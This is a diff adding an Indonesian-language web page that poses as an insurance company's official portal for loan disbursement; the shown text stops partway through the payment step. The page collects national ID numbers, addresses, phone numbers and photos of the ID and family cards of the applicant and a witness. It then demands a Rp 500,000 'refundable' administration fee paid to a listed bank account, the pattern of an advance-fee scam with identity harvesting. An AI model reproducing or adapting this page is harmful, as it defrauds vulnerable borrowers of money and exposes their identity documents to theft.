@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="id" class="scroll-smooth">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="theme-color" content="#1d4ed8">
+<meta name="description" content="Portal resmi penerbitan polis asuransi jiwa kredit & pencairan dana pinjaman PT Asuransi Sejahtera Tbk.">
+<title>Penerbitan Polis & Pencairan Dana - Portal Resmi Asuransi Sejahtera</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script>
+tailwind.config = {
+    theme: {
+        extend: {
+            colors: {
+                primary: '#1d4ed8',
+                'primary-dark': '#1e3a8a',
+                'primary-light': '#dbeafe',
+                'accent-gold': '#d97706',
+                'accent-green': '#15803d',
+                'accent-red': '#dc2626',
+            },
+            fontFamily: { sans: ['Inter', 'system-ui', 'sans-serif'] },
+            boxShadow: {
+                'soft': '0 4px 20px -4px rgba(15,23,42,0.08)',
+                'glow': '0 8px 30px -8px rgba(29,78,216,0.35)',
+            }
+        }
+    }
+}
+</script>
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
+    * { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
+    html, body { overscroll-behavior-y: none; }
+
+    @keyframes fadeInScale {
+        0% { opacity: 0; transform: scale(0.98) translateY(12px); }
+        100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    @keyframes pulseGlow {
+        0%, 100% { box-shadow: 0 0 0 0 rgba(29, 78, 216, 0.4); }
+        50% { box-shadow: 0 0 0 12px rgba(29, 78, 216, 0); }
+    }
+    @keyframes slideInRight {
+        from { opacity: 0; transform: translateX(20px); }
+        to { opacity: 1; transform: translateX(0); }
+    }
+    @keyframes toastIn {
+        from { opacity: 0; transform: translateY(-16px) scale(0.96); }
+        to { opacity: 1; transform: translateY(0) scale(1); }
+    }
+    @keyframes shimmer {
+        0% { background-position: -200% 0; }
+        100% { background-position: 200% 0; }
+    }
+    .animate-fade { animation: fadeInScale 0.35s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+    .glow-btn { animation: pulseGlow 2.5s infinite; }
+    .animate-slide { animation: slideInRight 0.3s ease-out forwards; }
+    .shimmer {
+        background: linear-gradient(90deg, #f1f5f9 0%, #e2e8f0 50%, #f1f5f9 100%);
+        background-size: 200% 100%;
+        animation: shimmer 2s infinite;
+    }
+
+    input:focus-visible, textarea:focus-visible, select:focus-visible, button:focus-visible {
+        outline: 2px solid #1d4ed8;
+        outline-offset: 2px;
+    }
+
+    .progress-track { background: #e2e8f0; height: 4px; border-radius: 999px; overflow: hidden; }
+    .progress-fill { height: 100%; background: linear-gradient(90deg, #1d4ed8, #6366f1); transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+
+    .dropzone.dragover { border-color: #1d4ed8 !important; background: #eff6ff !important; }
+
+    #toast-container { position: fixed; top: 1rem; left: 50%; transform: translateX(-50%); z-index: 100; display: flex; flex-direction: column; gap: .5rem; width: calc(100% - 2rem); max-width: 420px; pointer-events: none; }
+    .toast { pointer-events: auto; animation: toastIn .3s ease-out; }
+
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: #f1f5f9; }
+    ::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 3px; }
+    ::-webkit-scrollbar-thumb:hover { background: #94a3b8; }
+
+    @media (prefers-reduced-motion: reduce) {
+        *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
+    }
+
+    /* Sembunyikan spinner bawaan input number */
+    input[type=tel]::-webkit-outer-spin-button,
+    input[type=tel]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+
+    /* Gaya untuk input yang error */
+    .error input, .error textarea, .error select {
+        border-color: #dc2626 !important;
+        background-color: #fef2f2 !important;
+    }
+    .error .text-red-600 { display: block !important; }
+</style>
+</head>
+<body class="bg-slate-100 min-h-screen flex flex-col items-center justify-start p-3 sm:p-6 text-slate-900 bg-[radial-gradient(circle_at_15%_50%,rgba(29,78,216,0.06),transparent_25%),radial-gradient(circle_at_85%_30%,rgba(217,119,6,0.04),transparent_25%)] bg-fixed">
+
+<div class="w-full max-w-xl bg-white rounded-3xl shadow-xl overflow-hidden relative my-2 sm:my-4 border border-slate-200 flex flex-col">
+
+    <!-- ================= HEADER + PROGRESS ================= -->
+    <header class="sticky top-0 z-20 bg-white/95 backdrop-blur-md border-b border-slate-200">
+        <div class="flex items-center justify-between px-5 py-3.5 relative">
+            <button id="backBtn" onclick="goBack()" aria-label="Kembali ke langkah sebelumnya"
+                class="hidden items-center gap-1.5 text-primary font-semibold text-sm px-3 py-1.5 rounded-lg hover:bg-blue-50 active:scale-95 transition">
+                <svg class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
+                Kembali
+            </button>
+            <span class="absolute left-1/2 -translate-x-1/2 text-xs sm:text-sm font-extrabold text-primary-dark tracking-wider uppercase">PT Asuransi Jiwa</span>
+            <div class="flex items-center gap-1.5 text-[10px] font-bold text-emerald-700 bg-emerald-50 px-2 py-1 rounded-full border border-emerald-200">
+                <span class="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span> SECURE
+            </div>
+        </div>
+        <div class="progress-track mx-5 mb-2.5"><div id="progressFill" class="progress-fill" style="width: 0%"></div></div>
+    </header>
+
+    <!-- ================= HERO BANNER ================= -->
+    <div class="bg-gradient-to-br from-indigo-900 via-primary-dark to-primary p-6 sm:p-8 text-center text-white relative overflow-hidden">
+        <div class="absolute -right-10 -bottom-10 w-40 h-40 bg-white/5 rounded-full pointer-events-none blur-2xl"></div>
+        <div class="absolute -left-10 -top-10 w-32 h-32 bg-white/5 rounded-full pointer-events-none blur-2xl"></div>
+        <div class="w-16 h-16 bg-white rounded-2xl p-2.5 mx-auto mb-3 shadow-lg flex items-center justify-center transform hover:rotate-3 transition duration-300">
+            <img src="https://cdn-icons-png.flaticon.com/512/2950/2950106.png" alt="Logo Asuransi" class="w-full h-full object-contain">
+        </div>
+        <h1 class="text-xl sm:text-2xl font-black tracking-tight">ASURANSI SEJAHTERA</h1>
+        <p class="text-xs sm:text-sm text-indigo-100/90 mt-1">Layanan Digital Terpadu & Terverifikasi Otoritas Keuangan</p>
+    </div>
+
+    <!-- ================= MAIN CONTENT ================= -->
+    <main class="p-5 sm:p-8 min-h-[480px] relative flex flex-col justify-between">
+
+        <!-- ============ STAGE 1: INTRO ============ -->
+        <section id="intro-section" class="section active animate-fade">
+            <div class="mb-5">
+                <span class="inline-block bg-blue-100 text-primary font-bold text-xs px-3 py-1 rounded-full uppercase tracking-wider mb-2"></span>
+                <h2 class="text-xl sm:text-2xl font-bold text-slate-900">Pengajuan Polis & Pencairan Dana Pinjaman</h2>
+            </div>
+
+            <div class="rounded-2xl overflow-hidden mb-6 shadow-sm border border-slate-100 bg-slate-50">
+                <img src="https://images.bukaolshop.com/hosting/169312/ff5326dacf2b880362.png" alt="Ilustrasi Layanan Keuangan" class="w-full h-44 object-cover transform hover:scale-105 transition duration-500">
+                <div class="p-3 bg-white text-xs text-slate-600 font-medium text-center">Proses verifikasi resmi aman, cepat, dan transparan sesuai regulasi perbankan nasional.</div>
+            </div>
+
+            <div class="bg-blue-50/80 border border-blue-200 rounded-2xl p-4 sm:p-5 mb-6 text-slate-700 text-sm leading-relaxed shadow-sm">
+                <div class="flex items-start gap-3">
+                    <svg class="w-6 h-6 text-primary shrink-0 mt-0.5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                    <div>
+                        <strong class="text-primary-dark font-bold block mb-1">Panduan Lengkap Mengapa Sistem Ini Wajib:</strong>
+                        Sesuai standar operasional perbankan nasional dan lembaga pembiayaan, setiap pencairan dana pinjaman berjangka diwajibkan memiliki perlindungan <em>Asuransi Jiwa Kredit</em>. Polis ini berfungsi untuk menjamin pelunasan sisa pinjaman apabila terjadi risiko tak terduga pada peminjam, sekaligus menjadi kunci pengaman otomatis agar sistem perbankan mencairkan dana langsung ke rekening Anda.
+                    </div>
+                </div>
+            </div>
+
+            <div class="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-6">
+                <div class="flex items-center gap-2 text-amber-800 font-bold text-xs sm:text-sm mb-1">
+                    <svg class="w-4 h-4 shrink-0" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"/></svg>
+                    Hal Penting yang Perlu Anda Ketahui:
+                </div>
+                <p class="text-xs text-amber-900 leading-relaxed">Seluruh tahapan dirancang agar mudah diikuti oleh siapa saja tanpa hambatan. Pastikan data yang Anda masukkan sudah sesuai dengan dokumen fisik asli.</p>
+            </div>
+
+            <button onclick="navigate('policy-form-section')" class="w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-blue-500/25 transition active:scale-[0.98] flex items-center justify-center gap-2 glow-btn">
+                Mulai Pengajuan Sekarang
+                <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg>
+            </button>
+        </section>
+
+        <!-- ============ STAGE 2: FORM DATA DIRI ============ -->
+        <section id="policy-form-section" class="section hidden animate-fade">
+            <div class="mb-5">
+                <span class="inline-block bg-blue-100 text-primary font-bold text-xs px-3 py-1 rounded-full uppercase tracking-wider mb-2"></span>
+                <h2 class="text-xl sm:text-2xl font-bold text-slate-900">Formulir Data Diri Nasabah</h2>
+                <p class="text-xs sm:text-sm text-slate-500 mt-1">Lengkapi data diri di bawah ini dengan akurat sesuai kartu identitas resmi (KTP) Anda agar sistem dapat memproses validasi tanpa penolakan.</p>
+            </div>
+
+            <div class="space-y-4">
+                <div class="form-group" id="group-ktp">
+                    <label for="ktpNumber" class="block text-xs font-bold text-slate-800 mb-1.5">NIK KTP (Tepat 16 Digit Angka):</label>
+                    <input type="tel" id="ktpNumber" inputmode="numeric" maxlength="16" autocomplete="off" placeholder="Contoh: 3171234567890123" aria-describedby="ktpError" class="w-full p-3.5 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium focus:ring-4 focus:ring-blue-100 focus:border-primary transition" oninput="this.value=this.value.replace(/\D/g,''); validateInputRealtime('ktpNumber', 'group-ktp', val => /^\d{16}$/.test(val))">
+                    <span id="ktpError" class="text-xs text-red-600 mt-1 hidden font-medium">Nomor NIK KTP wajib tepat 16 digit angka.</span>
+                </div>
+
+                <div class="form-group" id="group-name">
+                    <label for="fullName" class="block text-xs font-bold text-slate-800 mb-1.5">Nama Lengkap (Sesuai KTP):</label>
+                    <input type="text" id="fullName" autocomplete="name" placeholder="Masukkan nama lengkap tanpa singkatan" aria-describedby="nameError" class="w-full p-3.5 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium focus:ring-4 focus:ring-blue-100 focus:border-primary transition" oninput="validateInputRealtime('fullName', 'group-name', val => val.trim().length >= 3)">
+                    <span id="nameError" class="text-xs text-red-600 mt-1 hidden font-medium">Nama lengkap minimal 3 karakter.</span>
+                </div>
+
+                <div class="form-group" id="group-phone">
+                    <label for="phoneNumber" class="block text-xs font-bold text-slate-800 mb-1.5">Nomor WhatsApp Aktif (Untuk Notifikasi):</label>
+                    <input type="tel" id="phoneNumber" inputmode="numeric" autocomplete="tel" placeholder="Contoh: 08123456789 (Awali angka 0)" aria-describedby="phoneError" class="w-full p-3.5 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium focus:ring-4 focus:ring-blue-100 focus:border-primary transition" oninput="this.value=this.value.replace(/\D/g,''); validateInputRealtime('phoneNumber', 'group-phone', val => /^0\d{8,13}$/.test(val))">
+                    <span id="phoneError" class="text-xs text-red-600 mt-1 hidden font-medium">Nomor WhatsApp tidak valid (minimal 9 digit, diawali angka 0).</span>
+                </div>
+
+                <div class="form-group" id="group-address">
+                    <label for="address" class="block text-xs font-bold text-slate-800 mb-1.5">Alamat Domisili Tempat Tinggal:</label>
+                    <textarea id="address" autocomplete="street-address" placeholder="Nama Jalan, Nomor Rumah, RT/RW, Kelurahan, Kecamatan, Kota..." aria-describedby="addressError" class="w-full p-3.5 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium focus:ring-4 focus:ring-blue-100 focus:border-primary transition resize-none h-20" oninput="validateInputRealtime('address', 'group-address', val => val.trim().length >= 10)"></textarea>
+                    <span id="addressError" class="text-xs text-red-600 mt-1 hidden font-medium">Alamat domisili wajib diisi lengkap (minimal 10 karakter).</span>
+                </div>
+
+                <div class="flex items-center gap-2 my-4 pt-2 border-t border-slate-200">
+                    <div class="w-2 h-2 rounded-full bg-primary"></div>
+                    <span class="text-xs font-bold text-primary uppercase tracking-wider">Informasi Manfaat & Ahli Waris</span>
+                </div>
+
+                <div class="form-group" id="group-coverage">
+                    <label for="coverageAmount" class="block text-xs font-bold text-slate-800 mb-1.5">Besaran Uang Pertanggungan / Pinjaman:</label>
+                    <input type="text" id="coverageAmount" inputmode="numeric" placeholder="Contoh: 10.000.000" aria-describedby="coverageError" class="w-full p-3.5 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium focus:ring-4 focus:ring-blue-100 focus:border-primary transition" oninput="formatRupiah(this); validateInputRealtime('coverageAmount', 'group-coverage', val => val.replace(/\D/g,'').length >= 6)">
+                    <span id="coverageError" class="text-xs text-red-600 mt-1 hidden font-medium">Nominal uang pertanggungan wajib diisi (minimal Rp 1.000.000).</span>
+                </div>
+
+                <div class="form-group" id="group-beneficiary">
+                    <label for="beneficiary" class="block text-xs font-bold text-slate-800 mb-1.5">Nama Lengkap Ahli Waris:</label>
+                    <input type="text" id="beneficiary" placeholder="Nama anggota keluarga terdekat" aria-describedby="beneficiaryError" class="w-full p-3.5 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium focus:ring-4 focus:ring-blue-100 focus:border-primary transition" oninput="validateInputRealtime('beneficiary', 'group-beneficiary', val => val.trim().length >= 3)">
+                    <span id="beneficiaryError" class="text-xs text-red-600 mt-1 hidden font-medium">Nama ahli waris wajib diisi.</span>
+                </div>
+
+                <div class="form-group" id="group-relation">
+                    <label for="relation" class="block text-xs font-bold text-slate-800 mb-1.5">Hubungan dengan Nasabah:</label>
+                    <select id="relation" aria-describedby="relationError" class="w-full p-3.5 bg-slate-50 border border-slate-300 rounded-xl text-sm font-medium focus:ring-4 focus:ring-blue-100 focus:border-primary transition" onchange="validateInputRealtime('relation', 'group-relation', val => val !== '')">
+                        <option value="" disabled selected>Pilih Hubungan Keluarga</option>
+                        <option value="Suami / Istri">Suami / Istri</option>
+                        <option value="Anak Kandung">Anak Kandung</option>
+                        <option value="Orang Tua">Orang Tua</option>
+                        <option value="Saudara Kandung">Saudara Kandung</option>
+                    </select>
+                    <span id="relationError" class="text-xs text-red-600 mt-1 hidden font-medium">Silakan pilih hubungan keluarga.</span>
+                </div>
+            </div>
+
+            <button onclick="validateForm1()" class="w-full mt-6 bg-primary hover:bg-primary-dark text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-blue-500/25 transition active:scale-[0.98]">
+                Lanjutkan ke Unggah Dokumen
+            </button>
+        </section>
+
+        <!-- ============ STAGE 3: UPLOAD KYC ============ -->
+        <section id="verification-section" class="section hidden animate-fade">
+            <div class="mb-5">
+                <span class="inline-block bg-blue-100 text-primary font-bold text-xs px-3 py-1 rounded-full uppercase tracking-wider mb-2"></span>
+                <h2 class="text-xl sm:text-2xl font-bold text-slate-900">Verifikasi Dokumen Fisik Asli</h2>
+                <p class="text-xs sm:text-sm text-slate-500 mt-1">Unggah foto dokumen fisik yang jelas (tidak buram dan tidak terpotong) guna mencegah pemalsuan data dan mempercepat verifikasi oleh tim audit.</p>
+            </div>
+
+            <div class="bg-emerald-50 border border-emerald-200 rounded-2xl p-4 mb-5 text-xs text-emerald-900 leading-relaxed">
+                <strong class="font-bold block mb-1">Panduan Pengambilan Foto yang Benar:</strong>
+                Pastikan seluruh sudut kartu KTP atau Kartu Keluarga terlihat jelas dalam bingkai kamera handphone Anda tanpa ada pantulan cahaya lampu. Ukuran file maksimal 5MB per foto (Format JPG/PNG).
+            </div>
+
+            <div class="space-y-3.5">
+                <div class="dropzone border-2 border-dashed border-slate-300 rounded-2xl p-4 text-center bg-slate-50 hover:bg-blue-50/50 hover:border-primary transition cursor-pointer relative" onclick="document.getElementById('ktpPhoto').click()">
+                    <span class="text-xs font-bold text-primary block mb-1">1. Foto KTP Nasabah / Peminjam</span>
+                    <span class="text-xs text-slate-500 font-medium block truncate" id="ktpPhotoName">Ketuk untuk memilih foto KTP</span>
+                    <input type="file" id="ktpPhoto" accept="image/png,image/jpeg,image/jpg,image/webp" class="absolute inset-0 opacity-0 cursor-pointer" onchange="updateFileName(this, 'ktpPhotoName')">
+                </div>
+
+                <div class="dropzone border-2 border-dashed border-slate-300 rounded-2xl p-4 text-center bg-slate-50 hover:bg-blue-50/50 hover:border-primary transition cursor-pointer relative" onclick="document.getElementById('saksiKtpPhoto').click()">
+                    <span class="text-xs font-bold text-primary block mb-1">2. Foto KTP Saksi / Keluarga</span>
+                    <span class="text-xs text-slate-500 font-medium block truncate" id="saksiKtpPhotoName">Ketuk untuk memilih foto KTP Saksi</span>
+                    <input type="file" id="saksiKtpPhoto" accept="image/png,image/jpeg,image/jpg,image/webp" class="absolute inset-0 opacity-0 cursor-pointer" onchange="updateFileName(this, 'saksiKtpPhotoName')">
+                </div>
+
+                <div class="dropzone border-2 border-dashed border-slate-300 rounded-2xl p-4 text-center bg-slate-50 hover:bg-blue-50/50 hover:border-primary transition cursor-pointer relative" onclick="document.getElementById('kkPhoto').click()">
+                    <span class="text-xs font-bold text-primary block mb-1">3. Foto Kartu Keluarga (KK)</span>
+                    <span class="text-xs text-slate-500 font-medium block truncate" id="kkPhotoName">Ketuk untuk memilih foto Kartu Keluarga</span>
+                    <input type="file" id="kkPhoto" accept="image/png,image/jpeg,image/jpg,image/webp" class="absolute inset-0 opacity-0 cursor-pointer" onchange="updateFileName(this, 'kkPhotoName')">
+                </div>
+
+                <div class="dropzone border-2 border-dashed border-slate-300 rounded-2xl p-4 text-center bg-slate-50 hover:bg-blue-50/50 hover:border-primary transition cursor-pointer relative" onclick="document.getElementById('ijasahPhoto').click()">
+                    <span class="text-xs font-bold text-slate-600 block mb-1">4. Foto Ijazah / Dokumen Tambahan (Opsional)</span>
+                    <span class="text-xs text-slate-400 font-medium block truncate" id="ijasahPhotoName">Ketuk untuk memilih dokumen (Opsional)</span>
+                    <input type="file" id="ijasahPhoto" accept="image/png,image/jpeg,image/jpg,image/webp" class="absolute inset-0 opacity-0 cursor-pointer" onchange="updateFileName(this, 'ijasahPhotoName')">
+                </div>
+            </div>
+
+            <button onclick="validateForm2()" class="w-full mt-6 bg-primary hover:bg-primary-dark text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-blue-500/25 transition active:scale-[0.98]">
+                Lanjutkan Pilih Metode Layanan
+            </button>
+        </section>
+
+        <!-- ============ STAGE 4: METHOD ============ -->
+        <section id="method-section" class="section hidden animate-fade">
+            <div class="mb-5">
+                <span class="inline-block bg-blue-100 text-primary font-bold text-xs px-3 py-1 rounded-full uppercase tracking-wider mb-2"></span>
+                <h2 class="text-xl sm:text-2xl font-bold text-slate-900">Pilih Jalur Penyelesaian Administrasi</h2>
+                <p class="text-xs sm:text-sm text-slate-500 mt-1">Pilih metode penyelesaian penerbitan polis asuransi Anda. Pilihan ini akan menentukan mekanisme pencairan dana ke rekening Anda.</p>
+            </div>
+
+            <div class="space-y-4 mb-6">
+                <div class="method-card border-2 border-slate-200 rounded-2xl p-5 cursor-pointer hover:border-slate-300 transition bg-white relative overflow-hidden" id="cardOnline" onclick="selectMethod('online')">
+                    <div class="flex items-start gap-3">
+                        <div class="w-10 h-10 rounded-xl bg-blue-100 text-primary flex items-center justify-center font-bold shrink-0 mt-0.5">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 13.5l10.5-11.25L12 10.5h8.25L9.75 21.75 12 13.5H3.75z"/></svg>
+                        </div>
+                        <div>
+                            <h3 class="font-extrabold text-slate-900 text-base mb-1">Jalur Online Elektronik (Direkomendasikan)</h3>
+                            <p class="text-xs text-slate-600 leading-relaxed">Polis diterbitkan secara instan melalui sistem elektronik digital. Pencairan dana ditransfer langsung ke rekening Anda tanpa perlu repot meluangkan waktu datang ke kantor fisik.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="method-card border-2 border-slate-200 rounded-2xl p-5 cursor-pointer hover:border-slate-300 transition bg-white relative overflow-hidden" id="cardOffline" onclick="selectMethod('offline')">
+                    <div class="flex items-start gap-3">
+                        <div class="w-10 h-10 rounded-xl bg-slate-100 text-slate-600 flex items-center justify-center font-bold shrink-0 mt-0.5">
+                            <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/></svg>
+                        </div>
+                        <div>
+                            <h3 class="font-extrabold text-slate-900 text-base mb-1">Jalur Tatap Muka / Datang ke Kantor</h3>
+                            <p class="text-xs text-slate-600 leading-relaxed">Wajib datang secara fisik ke kantor pusat dengan membawa seluruh dokumen asli untuk verifikasi manual dan tanda tangan basah di hadapan petugas.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <input type="hidden" id="selectedMethodValue" value="">
+            <button onclick="processMethod()" class="w-full bg-primary hover:bg-primary-dark text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-blue-500/25 transition active:scale-[0.98]">
+                Lanjutkan Proses Sesuai Pilihan
+            </button>
+        </section>
+
+        <!-- ============ STAGE 5A: OFFLINE ============ -->
+        <section id="offline-instruction-section" class="section hidden animate-fade">
+            <div class="mb-5">
+                <span class="inline-block bg-amber-100 text-amber-800 font-bold text-xs px-3 py-1 rounded-full uppercase tracking-wider mb-2">Jalur Terpilih: Offline / Kantor</span>
+                <h2 class="text-xl sm:text-2xl font-bold text-slate-900">Instruksi Kunjungan Kantor Pusat</h2>
+            </div>
+
+            <div class="bg-red-50 border border-red-200 border-l-4 border-l-red-600 rounded-xl p-4 mb-5 text-xs text-red-900 leading-relaxed">
+                <strong class="font-bold block mb-1">Pemberitahuan Sistem:</strong>
+                Anda telah memilih jalur kedatangan fisik. Proses pencairan otomatis via aplikasi dihentikan sementara hingga verifikasi tatap muka selesai dilakukan di kantor pusat.
+            </div>
+
+            <div class="bg-slate-50 border border-slate-200 rounded-2xl p-5 mb-5">
+                <p class="text-xs font-bold text-slate-700 uppercase tracking-wider mb-2">Alamat Kantor Pusat Pelayanan:</p>
+                <strong class="text-base text-primary-dark block mb-2">Gedung Menara Financial Center, Lantai 15</strong>
+                <p class="text-xs text-slate-600 leading-relaxed">Jl. Jend. Sudirman Kav. 52-53, Jakarta Selatan 12190<br>Jam Operasional: Senin - Jumat (08.00 - 15.00 WIB)</p>
+            </div>
+
+            <div class="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-6 text-xs text-blue-900 leading-relaxed">
+                <strong class="font-bold block mb-1">Persyaratan Dokumen yang Wajib Dibawa:</strong>
+                <ul class="list-disc pl-4 space-y-1 mt-1 font-medium">
+                    <li>KTP Asli Pemohon & Kartu Keluarga Asli.</li>
+                    <li>KTP Asli Saksi pendamping yang terdaftar.</li>
+                    <li>Berpakaian rapi dan formal sesuai standar kantor.</li>
+                </ul>
+            </div>
+
+            <button onclick="location.reload()" class="w-full bg-slate-600 hover:bg-slate-700 text-white font-bold py-4 px-6 rounded-2xl transition active:scale-[0.98]">
+                Tutup & Selesai
+            </button>
+        </section>
+
+        <!-- ============ STAGE 5B: PREMIUM PROMPT ============ -->
+        <section id="premium-prompt-section" class="section hidden animate-fade">
+            <div class="mb-5">
+                <span class="inline-block bg-blue-100 text-primary font-bold text-xs px-3 py-1 rounded-full uppercase tracking-wider mb-2">Jalur Terpilih: Online Digital</span>
+                <h2 class="text-xl sm:text-2xl font-bold text-slate-900">Validasi & Biaya Administrasi Formalitas</h2>
+            </div>
+
+            <div class="rounded-2xl overflow-hidden mb-6 shadow-sm border border-slate-100 bg-slate-50">
+                <img src="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=800&q=80" alt="Keamanan Transaksi Digital" class="w-full h-40 object-cover">
+                <div class="p-3 bg-white text-xs text-slate-600 font-medium text-center">Enkripsi pembayaran aman terverifikasi sistem perbankan nasional.</div>
+            </div>
+
+            <div class="bg-blue-50 border border-blue-200 rounded-2xl p-4 sm:p-5 mb-6 text-slate-700 text-xs sm:text-sm leading-relaxed">
+                <strong class="text-primary-dark font-bold block mb-2 text-sm">Penjelasan Lengkap Mengapa Ada Biaya Formalitas Sementara:</strong>
+                <p class="mb-2">Banyak nasabah sering bertanya mengapa ada biaya administrasi awal sebesar <strong>Rp 500.000</strong> ini. Berikut adalah penjelasan transparan yang wajib Anda pahami:</p>
+                <ul class="list-disc pl-4 space-y-1.5 font-medium text-slate-700">
+                    <li>Biaya ini merupakan setoran premi administrasi resmi untuk penerbitan polis asuransi jiwa elektronik oleh lembaga penjamin.</li>
+                    <li>Sistem perbankan otomatis mengunci pencairan dana apabila polis belum diaktifkan secara sah.</li>
+                    <li><strong>100% Uang Dikembalikan:</strong> Setoran formalitas Anda dijamin tidak hilang. Begitu sistem mendeteksi validasi berhasil, dana sebesar Rp 500.000 tersebut <strong>akan ditransfer kembali utuh 100%</strong> secara bersamaan dengan pencairan total dana pinjaman Anda ke rekening Anda.</li>
+                </ul>
+            </div>
+
+            <div class="text-center bg-red-50 border border-red-200 rounded-2xl p-5 mb-6 shadow-sm">
+                <span class="text-xs font-bold text-red-700 uppercase tracking-widest block mb-1">Nominal Setoran Formalitas Sementara</span>
+                <div class="text-2xl sm:text-3xl font-extrabold text-red-600 tracking-wide">Rp 500.000</div>
+                <span class="text-[11px] text-red-500 font-medium mt-1 block">Dikembalikan utuh 100% bersamaan saat dana pinjaman cair.</span>
+            </div>
+
+            <button onclick="navigate('payment-page-section')" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg shadow-red-500/25 transition active:scale-[0.98] glow-btn">
+                Lanjut ke Instruksi Pembayaran Resmi
+            </button>
+        </section>
+
+        <!-- ============ STAGE 6: PAYMENT ============ -->
+        <section id="payment-page-section" class="section hidden animate-fade">
+            <div class="mb-5">
+                <span class="inline-block bg-blue-100 text-primary font-bold text-xs px-3 py-1 rounded-full uppercase tracking-wider mb-2">Instruksi Pembayaran</span>
+                <h2 class="text-xl sm:text-2xl font-bold text-slate-900">Transfer ke Rekening Penampungan Resmi</h2>
+                <p class="text-xs sm:text-sm text-slate-500 mt-1">Silakan lakukan transfer tepat sebesar <strong class="text-slate-900">Rp 500.000</strong> melalui ATM, Mobile Banking, atau Internet Banking ke Virtual Account di bawah ini:</p>
+            </div>
+
+            <div class="bg-slate-50 border border-slate-300 rounded-2xl p-5 mb-6 shadow-sm relative overflow-hidden">
+                <div class="absolute top-0 right-0 bg-primary text-white text-[10px] font-bold px-3 py-1 rounded-bl-xl uppercase tracking-wider">Virtual Account Resmi</div>
+
+                <div class="mb-3">
+                    <span class="text-xs text-slate-500 font-medium block">Bank Tujuan:</span>
+                    <strong class="text-slate-900 text-base font-bold">Bank BRI</strong>
+                </div>
+
+                <div class="mb-3">
+                    <span class="text-xs text-slate-500 font-medium block">Nomor Rekening:</span>
+                    <div class="flex items-center justify-between mt-1 gap-2">
+                        <span id="vaNumber" class="text-xl sm:text-2xl font-black text-primary tracking-widest">5056 0102 6829 539</span>
+                        <button onclick="copyVA()" aria-label="Salin nomor Virtual Account" class="shrink-0 p-2 rounded-lg bg-blue-50 text-primary hover:bg-blue-100 transition active:scale-95">
+                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
+                        </button>
+                    </div>
+                </div>
+
+                <div>
+                    <span class="text-xs text-slate-500 font-medium block">Atas Nama Penerima:</span>
+                    <strong class="text-slate-900 text-sm font-bold uppercase">PT ASURANSI SEJAHTERA TBK</strong>
+                </div>
+            </div>
+
+            <div class="bg-amber-50 border border-amber-200 rounded-xl p-4 mb-6 text-xs text-amber-900 leading-relaxed">
+                <strong class="font-bold block mb-1">Panduan Penting Sebelum Konfirmasi:</strong>
